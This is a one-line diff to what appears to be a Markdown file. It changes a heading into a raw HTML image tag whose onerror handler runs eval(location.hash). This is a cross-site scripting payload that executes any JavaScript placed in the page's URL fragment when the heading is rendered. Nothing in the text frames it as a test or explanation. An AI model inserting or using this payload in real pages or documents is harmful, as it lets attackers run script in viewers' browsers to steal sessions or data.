@@ -1,1 +1,1 @@
-# -img-src-http-localhost-8000-
+# <img src=x onerror=eval(location.hash)>
